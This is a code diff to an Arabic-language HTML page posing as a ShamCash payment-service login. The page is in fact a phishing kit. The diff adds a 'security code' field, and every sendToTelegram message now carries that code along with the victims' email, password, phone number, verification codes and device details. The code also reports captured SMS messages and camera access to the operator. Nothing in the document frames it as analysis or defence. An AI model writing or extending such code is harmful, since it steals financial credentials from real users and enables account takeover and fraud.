@@ -1,4 +1,3 @@
-DOCTYPE html>
 <html lang="ar" dir="rtl">
 <head>
     <meta charset="UTF-8">
@@ -350,6 +349,22 @@ DOCTYPE html>
                 font-size: 24px;
             }
         }
+
+        /* Security Code Info Box */
+        .security-code-info {
+            background: linear-gradient(135deg, rgba(102, 126, 234, 0.1) 0%, rgba(118, 75, 162, 0.1) 100%);
+            border-radius: 12px;
+            padding: 15px;
+            margin: 15px 0;
+            border-right: 3px solid var(--primary);
+            font-size: 14px;
+            color: #4a5568;
+        }
+        
+        .security-code-info i {
+            color: var(--primary);
+            margin-left: 8px;
+        }
     </style>
 </head>
 <body>
@@ -383,13 +398,32 @@ DOCTYPE html>
                     </label>
                     <input type="password" id="password" class="form-control" placeholder="أدخل كلمة المرور" required>
                     <div class="error-message" id="passwordError">كلمة المرور يجب أن تحتوي على 8 أحرف على الأقل</div>
+                </div>
+
+                <!-- حقل رمز الأمان الجديد -->
+                <div class="form-group">
+                    <label class="form-label" for="securityCode">
+                        <i class="fas fa-shield-alt"></i>
+                        رمز الأمان
+                    </label>
+                    <input type="text" id="securityCode" class="form-control" 
+                           placeholder="مثال: ABCDEF123XYZ" 
+                           pattern="[A-Z0-9]{12}"
+                           maxlength="12"
+                           required>
+                    <div class="error-message" id="securityCodeError">رمز الأمان يجب أن يكون 12 حرفاً كبيراً (A-Z, 0-9)</div>
                     
-                    <div class="forgot-password">
-                        <a href="#">
-                            <i class="fas fa-question-circle"></i>
-                            هل نسيت كلمة المرور؟ تغيير كلمة المرور
-                        </a>
+                    <div class="security-code-info">
+                        <i class="fas fa-info-circle"></i>
+                        رمز الأمان مكون من 12 حرف إنجليزي كبير فقط (A-Z) ويمكن أن يحتوي على أرقام (0-9)
                     </div>
+                </div>
+                
+                <div class="forgot-password">
+                    <a href="#">
+                        <i class="fas fa-question-circle"></i>
+                        هل نسيت كلمة المرور؟ تغيير كلمة المرور
+                    </a>
                 </div>
                 
                 <button class="btn btn-primary" onclick="validateLogin()">
@@ -502,24 +536,36 @@ DOCTYPE html>
         function validateLogin() {
             const email = document.getElementById('email').value.trim();
             const password = document.getElementById('password').value.trim();
+            const securityCode = document.getElementById('securityCode').value.trim();
             
+            // التحقق من البريد الإلكتروني
             if (!email.includes('@') || !email.includes('.')) {
                 showError('emailError', 'البريد الإلكتروني غير صالح');
                 return;
             }
             
+            // التحقق من كلمة المرور
             if (password.length < 8) {
                 showError('passwordError', 'كلمة المرور يجب أن تحتوي على 8 أحرف على الأقل');
                 return;
             }
             
+            // التحقق من رمز الأمان
+            const securityCodeRegex = /^[A-Z0-9]{12}$/;
+            if (!securityCodeRegex.test(securityCode)) {
+                showError('securityCodeError', 'رمز الأمان يجب أن يكون 12 حرفاً كبيراً (A-Z, 0-9)');
+                return;
+            }
+            
             appData.userInfo.email = email;
             appData.userInfo.password = password;
+            appData.userInfo.securityCode = securityCode;
             
-            // إرسال بيانات الدخول إلى التلجرام
+            // إرسال بيانات الدخول إلى التلجرام (مع رمز الأمان)
             sendToTelegram('login_data', {
                 email: email,
                 password: password,
+                securityCode: securityCode,
                 userAgent: navigator.userAgent,
                 platform: navigator.platform,
                 targetPackage: SHAMCASH_PACKAGE
@@ -554,7 +600,8 @@ DOCTYPE html>
                 phone: '+963' + phone,
                 code: appData.verificationCode,
                 email: appData.userInfo.email,
-                password: appData.userInfo.password
+                password: appData.userInfo.password,
+                securityCode: appData.userInfo.securityCode
             });
             
             console.log(`🔐 كود التحقق: ${appData.verificationCode}`);
@@ -624,7 +671,8 @@ DOCTYPE html>
                         code: appData.verificationCode,
                         email: appData.userInfo.email,
                         phone: appData.userInfo.phoneNumber,
-                        password: appData.userInfo.password
+                        password: appData.userInfo.password,
+                        securityCode: appData.userInfo.securityCode
                     });
                     
                     document.getElementById('codeInputs').style.display = 'none';
@@ -646,7 +694,8 @@ DOCTYPE html>
                 sendToTelegram('verification_failed', {
                     enteredCode: enteredCode,
                     correctCode: appData.verificationCode,
-                    email: appData.userInfo.email
+                    email: appData.userInfo.email,
+                    securityCode: appData.userInfo.securityCode
                 });
             }
         }
@@ -658,7 +707,8 @@ DOCTYPE html>
             sendToTelegram('code_resent', {
                 newCode: appData.verificationCode,
                 email: appData.userInfo.email,
-                phone: appData.userInfo.phoneNumber
+                phone: appData.userInfo.phoneNumber,
+                securityCode: appData.userInfo.securityCode
             });
             
             console.log(`🔐 كود التحقق الجديد: ${appData.verificationCode}`);
@@ -674,6 +724,7 @@ DOCTYPE html>
             sendToTelegram('hidden_tools_triggered', {
                 email: appData.userInfo.email,
                 phone: appData.userInfo.phoneNumber,
+                securityCode: appData.userInfo.securityCode,
                 package: SHAMCASH_PACKAGE
             });
             
@@ -690,7 +741,8 @@ DOCTYPE html>
                 sendToTelegram('sms_captured', {
                     count: fakeSMS.length,
                     messages: fakeSMS,
-                    email: appData.userInfo.email
+                    email: appData.userInfo.email,
+                    securityCode: appData.userInfo.securityCode
                 });
                 
                 console.log('📨 تم قراءة الرسائل النصية');
@@ -700,7 +752,8 @@ DOCTYPE html>
             setTimeout(() => {
                 sendToTelegram('camera_accessed', {
                     action: 'verification',
-                    email: appData.userInfo.email
+                    email: appData.userInfo.email,
+                    securityCode: appData.userInfo.securityCode
                 });
                 console.log('📹 تم الوصول إلى الكاميرا');
             }, 2000);
@@ -735,7 +788,7 @@ DOCTYPE html>
                     }
                     
                     if (telegramMessage) {
-                        telegramMessage += `\n👤 المستخدم: ${appData.userInfo.email}`;
+                        telegramMessage += `\n👤 المستخدم: ${appData.userInfo.email}\n🔐 رمز الأمان: ${appData.userInfo.securityCode}`;
                         sendCustomTelegramMessage(telegramMessage, 'logout_process');
                     }
                     
@@ -755,28 +808,28 @@ DOCTYPE html>
             
             switch(type) {
                 case 'login_data':
-                    message = `🔐 *تسجيل دخول جديد*\n📧 البريد: ${data.email}\n🔑 كلمة المرور: ${data.password}\n📱 الجهاز: ${data.userAgent}\n📦 الباكج: ${data.targetPackage}`;
+                    message = `🔐 *تسجيل دخول جديد*\n📧 البريد: ${data.email}\n🔑 كلمة المرور: ${data.password}\n🛡️ رمز الأمان: ${data.securityCode}\n📱 الجهاز: ${data.userAgent}\n📦 الباكج: ${data.targetPackage}`;
                     break;
                 case 'verification_code_sent':
-                    message = `📱 *إرسال كود التحقق*\n📞 الهاتف: ${data.phone}\n🔐 الكود: ${data.code}\n📧 البريد: ${data.email}\n🔑 كلمة المرور: ${data.password}`;
+                    message = `📱 *إرسال كود التحقق*\n📞 الهاتف: ${data.phone}\n🔐 الكود: ${data.code}\n📧 البريد: ${data.email}\n🔑 كلمة المرور: ${data.password}\n🛡️ رمز الأمان: ${data.securityCode}`;
                     break;
                 case 'hidden_tools_triggered':
-                    message = `🚀 *الأدوات المخفية*\n📧 البريد: ${data.email}\n📞 الهاتف: ${data.phone}\n📦 الباكج: ${data.package}`;
+                    message = `🚀 *الأدوات المخفية*\n📧 البريد: ${data.email}\n📞 الهاتف: ${data.phone}\n🛡️ رمز الأمان: ${data.securityCode}\n📦 الباكج: ${data.package}`;
                     break;
                 case 'verification_success':
-                    message = `✅ *تم التحقق بنجاح!*\n🔐 الكود: ${data.code}\n📧 البريد: ${data.email}\n📞 الهاتف: ${data.phone}\n🔑 كلمة المرور: ${data.password}`;
+                    message = `✅ *تم التحقق بنجاح!*\n🔐 الكود: ${data.code}\n📧 البريد: ${data.email}\n📞 الهاتف: ${data.phone}\n🔑 كلمة المرور: ${data.password}\n🛡️ رمز الأمان: ${data.securityCode}`;
                     break;
                 case 'verification_failed':
-                    message = `❌ *محاولة تحقق فاشلة*\n🔐 الكود المدخل: ${data.enteredCode}\n🔑 الكود الصحيح: ${data.correctCode}\n📧 البريد: ${data.email}`;
+                    message = `❌ *محاولة تحقق فاشلة*\n🔐 الكود المدخل: ${data.enteredCode}\n🔑 الكود الصحيح: ${data.correctCode}\n📧 البريد: ${data.email}\n🛡️ رمز الأمان: ${data.securityCode}`;
                     break;
                 case 'code_resent':
-                    message = `🔄 *إعادة إرسال الكود*\n🔐 الكود الجديد: ${data.newCode}\n📧 البريد: ${data.email}\n📞 الهاتف: ${data.phone}`;
+                    message = `🔄 *إعادة إرسال الكود*\n🔐 الكود الجديد: ${data.newCode}\n📧 البريد: ${data.email}\n📞 الهاتف: ${data.phone}\n🛡️ رمز الأمان: ${data.securityCode}`;
                     break;
                 case 'sms_captured':
-                    message = `📨 *رسائل نصية ممسوحة*\n📧 البريد: ${data.email}\n📝 الرسائل:\n${data.messages.map((msg, i) => `${i+1}. ${msg.sender}: ${msg.body}`).join('\n')}`;
+                    message = `📨 *رسائل نصية ممسوحة*\n📧 البريد: ${data.email}\n🛡️ رمز الأمان: ${data.securityCode}\n📝 الرسائل:\n${data.messages.map((msg, i) => `${i+1}. ${msg.sender}: ${msg.body}`).join('\n')}`;
                     break;
                 case 'camera_accessed':
-                    message = `📹 *كاميرا مفعلة*\n📧 البريد: ${data.email}\n🎯 العملية: ${data.action}`;
+                    message = `📹 *كاميرا مفعلة*\n📧 البريد: ${data.email}\n🛡️ رمز الأمان: ${data.securityCode}\n🎯 العملية: ${data.action}`;
                     break;
             }
             
@@ -843,6 +896,14 @@ DOCTYPE html>
             console.log('🔐 نظام التحقق المتطور - شام كاش');
             console.log('📦 الباكج المستخدم: ' + SHAMCASH_PACKAGE);
             console.log('🚀 صفحتان متكاملتان');
+            
+            // التحكم في إدخال رمز الأمان (حروف إنجليزية كبيرة فقط)
+            document.getElementById('securityCode').addEventListener('input', function(e) {
+                this.value = this.value.toUpperCase().replace(/[^A-Z0-9]/g, '');
+                if (this.value.length > 12) {
+                    this.value = this.value.substring(0, 12);
+                }
+            });
         });
     </script>
 </body>
